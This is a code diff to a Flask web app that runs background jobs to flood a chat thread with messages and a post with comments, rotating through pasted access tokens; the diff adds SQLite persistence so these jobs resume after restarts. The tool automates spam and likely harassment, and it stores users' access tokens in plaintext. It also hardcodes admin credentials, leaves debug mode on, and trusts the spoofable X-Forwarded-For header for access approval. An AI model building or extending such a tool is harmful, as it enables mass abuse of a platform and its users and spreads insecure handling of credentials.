@@ -5,6 +5,7 @@ import time
 import random
 import string
 import os
+import sqlite3, json
 
 app = Flask(__name__)
 app.debug = True
@@ -17,8 +18,8 @@ approved_users = set()
 pending_requests = set()
 
 # Admin credentials
-ADMIN_USERNAME = 'admin'
-ADMIN_PASSWORD = 'adminpass123'
+ADMIN_USERNAME = 'Admin'
+ADMIN_PASSWORD = 'Rulex'
 
 # ----------------- Running Tasks Dictionary -----------------
 running_tasks = {}  
@@ -40,11 +41,49 @@ headers = {
     'referer': 'www.google.com'
 }
 
-# Helper to identify a device/user (by IP)
+# ----------------- SQLite DB -----------------
+DB_PATH = "tasks.db"
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
+        task_id TEXT PRIMARY KEY,
+        username TEXT,
+        type TEXT,
+        status TEXT,
+        params TEXT
+    )''')
+    conn.commit()
+    conn.close()
+
+def save_task(task_id, username, type_, params):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO tasks VALUES (?,?,?,?,?)",
+              (task_id, username, type_, "running", json.dumps(params)))
+    conn.commit()
+    conn.close()
+
+def load_running_tasks():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT task_id, username, type, params FROM tasks WHERE status='running'")
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+def update_task_status(task_id, status):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE tasks SET status=? WHERE task_id=?", (status, task_id))
+    conn.commit()
+    conn.close()
+
+# ----------------- Helper -----------------
 def get_user_id():
     ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
     return ip
-
 
 # ----------------- Middleware -----------------
 @app.before_request
@@ -71,12 +110,10 @@ def check_approval():
     if user_id not in approved_users:
         return redirect(url_for('approval_request'))
 
-
 # ----------------- Home -----------------
 @app.route('/')
 def home():
     return render_template("home.html")
-
 
 # ----------------- Convo Task -----------------
 @app.route('/convo', methods=['GET','POST'])
@@ -101,14 +138,21 @@ def convo():
         threads[task_id] = thread
         thread.start()
 
-        # Track running task
         username = session.get("username", get_user_id())
         running_tasks.setdefault(username, {})[task_id] = {"type": "convo", "status": "running"}
+
+        # Save to DB
+        save_task(task_id, username, "convo", {
+            "tokens": access_tokens,
+            "thread_id": thread_id,
+            "mn": mn,
+            "interval": time_interval,
+            "messages": messages
+        })
 
         return redirect(url_for("my_tasks"))
 
     return render_template("convo_form.html")
-
 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
@@ -123,7 +167,6 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 response = requests.post(api_url, data=parameters, headers=headers)
                 print("✅" if response.status_code == 200 else "❌", message)
                 time.sleep(time_interval)
-
 
 # ----------------- Post Task -----------------
 @app.route('/post', methods=['GET','POST'])
@@ -150,14 +193,21 @@ def post():
             thread.start()
             threads[task_id] = thread
 
-            # Track running task
             username = session.get("username", get_user_id())
             running_tasks.setdefault(username, {})[task_id] = {"type": "post", "status": "running"}
+
+            # Save to DB
+            save_task(task_id, username, "post", {
+                "post_id": post_id,
+                "tokens": tokens,
+                "comments": comments,
+                "hname": hname,
+                "delay": int(delay)
+            })
 
         return redirect(url_for("my_tasks"))
 
     return render_template("post_form.html")
-
 
 def post_comments(post_id, tokens, comments, hname, delay, task_id):
     stop_event = stop_events[task_id]
@@ -171,7 +221,6 @@ def post_comments(post_id, tokens, comments, hname, delay, task_id):
         token_index += 1
         time.sleep(delay)
 
-
 # ----------------- Stop Task (User/Admin) -----------------
 @app.route("/stop_task/<username>/<task_id>")
 def stop_task(username, task_id):
@@ -180,15 +229,14 @@ def stop_task(username, task_id):
 
     user_tasks = running_tasks.get(username, {})
     if task_id in user_tasks:
-        # Stop background task
         if task_id in stop_events:
             stop_events[task_id].set()
         user_tasks.pop(task_id)
+        update_task_status(task_id, "stopped")
 
     return redirect(
         url_for("admin_tasks") if session.get("admin_logged_in") else url_for("my_tasks")
     )
-
 
 # ----------------- User Tasks Page -----------------
 @app.route("/my_tasks")
@@ -197,14 +245,12 @@ def my_tasks():
     user_tasks = running_tasks.get(username, {})
     return render_template("my_tasks.html", username=username, tasks=user_tasks)
 
-
 # ----------------- Admin Tasks Page -----------------
 @app.route("/admin/tasks")
 def admin_tasks():
-    if not session.get("admin_logged_in"):
-        return redirect(url_for("admin_login"))
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
     return render_template("admin_tasks.html", running_tasks=running_tasks)
-
 
 # ----------------- Self-Ping Feature -----------------
 def self_ping():
@@ -216,7 +262,6 @@ def self_ping():
         except:
             print("⚠️ Self-ping failed")
         time.sleep(300)
-
 
 # ----------------- Approval + Admin routes -----------------
 @app.route('/approval_request', methods=['GET', 'POST'])
@@ -233,11 +278,9 @@ def approval_request():
             return render_template('approval_request.html', already_requested=True)
     return render_template('approval_request.html')
 
-
 @app.route('/approval_sent')
 def approval_sent():
     return render_template('approval_sent.html')
-
 
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
@@ -255,14 +298,12 @@ def admin_login():
             return render_template('admin_login.html', error=True)
     return render_template('admin_login.html')
 
-
 @app.route('/admin/logout')
 def admin_logout():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
     session.pop('admin_logged_in', None)
     return redirect(url_for('home'))
-
 
 @app.route('/admin/panel')
 def admin_panel():
@@ -271,7 +312,6 @@ def admin_panel():
     return render_template('admin_panel.html',
                            pending_requests=list(pending_requests),
                            approved_users=list(approved_users))
-
 
 @app.route('/admin/approve/<user_id>')
 def approve_user(user_id):
@@ -282,7 +322,6 @@ def approve_user(user_id):
         approved_users.add(user_id)
     return redirect(url_for('admin_panel'))
 
-
 @app.route('/admin/reject/<user_id>')
 def reject_user(user_id):
     if not session.get('admin_logged_in'):
@@ -290,7 +329,6 @@ def reject_user(user_id):
     if user_id in pending_requests:
         pending_requests.remove(user_id)
     return redirect(url_for('admin_panel'))
-
 
 @app.route('/admin/remove/<user_id>')
 def remove_user(user_id):
@@ -300,8 +338,29 @@ def remove_user(user_id):
         approved_users.remove(user_id)
     return redirect(url_for('admin_panel'))
 
-
+# ----------------- Startup -----------------
 if __name__ == '__main__':
+    init_db()
+
+    # Reload running tasks from DB
+    for task_id, username, type_, params in load_running_tasks():
+        params = json.loads(params)
+        stop_events[task_id] = Event()
+
+        if type_ == "convo":
+            thread = Thread(target=send_messages,
+                            args=(params["tokens"], params["thread_id"],
+                                  params["mn"], params["interval"],
+                                  params["messages"], task_id))
+        elif type_ == "post":
+            thread = Thread(target=post_comments,
+                            args=(params["post_id"], params["tokens"],
+                                  params["comments"], params["hname"],
+                                  params["delay"], task_id))
+        threads[task_id] = thread
+        thread.start()
+        running_tasks.setdefault(username, {})[task_id] = {"type": type_, "status": "running"}
+
     ping_thread = Thread(target=self_ping, daemon=True)
     ping_thread.start()
     app.run(host='0.0.0.0', port=10000)
